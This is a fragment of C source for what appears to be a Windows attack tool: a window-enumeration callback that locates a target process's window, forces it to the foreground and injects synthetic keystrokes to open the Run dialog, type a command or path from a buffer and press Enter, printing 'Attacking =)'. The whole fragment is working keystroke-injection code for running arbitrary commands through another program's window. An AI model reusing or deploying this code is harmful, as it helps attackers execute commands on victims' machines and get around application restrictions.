void ExplorerExecution (HWND hwnd, LPARAM lParam){
	DWORD hwndid;
    int i;


	GetWindowThreadProcessId(hwnd,&hwndid);

	if (hwndid == pid){
    /*
      Replace keybd_event with SendMessage() and PostMessage() calls 
    */
        printf("HANDLE Found. Attacking =)\n");
        SetForegroundWindow(hwnd);
        keybd_event(VK_LWIN,1,0,0);
        keybd_event(VkKeyScan('r'),1,0,0);
        keybd_event(VK_LWIN,1,KEYEVENTF_KEYUP,0);
        keybd_event(VkKeyScan('r'),1,KEYEVENTF_KEYUP,0);
        for(i=0;i<strlen(buf);i++) {
            if (buf[i]==':') {
                keybd_event(VK_SHIFT,1,0,0);
                keybd_event(VkKeyScan(buf[i]),1,0,0);
                keybd_event(VK_SHIFT,1,KEYEVENTF_KEYUP,0);
                keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
            } else {
                if (buf[i]=='\\') {
                    keybd_event(VK_LMENU,1,0,0);
                    keybd_event(VK_CONTROL,1,0,0);
                    keybd_event(VkKeyScan('º'),1,0,0);
                    keybd_event(VK_LMENU,1,KEYEVENTF_KEYUP,0);
                    keybd_event(VK_CONTROL,1,KEYEVENTF_KEYUP,0);
                    keybd_event(VkKeyScan('º'),1,KEYEVENTF_KEYUP,0);
                } else {
                    keybd_event(VkKeyScan(buf[i]),1,0,0);
                    keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
                }
            }
        }
        keybd_event(VK_RETURN,1,0,0);
        keybd_event(VK_RETURN,1,KEYEVENTF_KEYUP,0);
        exit(1);
    }
}